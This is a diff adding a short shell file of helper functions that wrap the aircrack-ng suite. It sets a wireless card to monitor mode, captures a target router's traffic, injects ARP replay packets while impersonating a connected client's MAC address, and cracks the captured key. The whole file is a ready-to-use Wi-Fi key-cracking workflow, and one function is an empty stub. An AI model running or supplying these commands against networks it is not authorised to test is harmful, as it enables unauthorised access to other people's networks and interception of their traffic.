@@ -1,0 +1,34 @@
+export landevice="wlan0"
+
+# Turn your network device to monitor mode
+function ng-monitor {
+  echo "Starting $landevice in monitor mode..."
+  /sbin/ifconfig $landevice down && /sbin/iwconfig $landevice mode monitor && /sbin/ifconfig $landevice up    
+}
+
+function ng-proclean {
+  echo $1
+}
+
+# Capture packets to find wireless networks.
+function ng-dump {
+  airodump-ng $landevice
+}
+
+# Capture packets being send to a specific network.
+function ng-capture {
+# usage ng-capture DUMPFILE ROUTERMAC
+  airodump-ng --bssid $2 -c 11 -w $1 $landevice
+}
+
+# Pretend to be already connected device and send ARP requests to router
+# usage ng-injectarp DEVICEMAC ROUTERMAC
+function ng-injectarp {
+  aireplay-ng -3 -b $2 -h $1 $landevice
+}
+
+function ng-crack {
+  aircrack-ng $1
+}
+
+
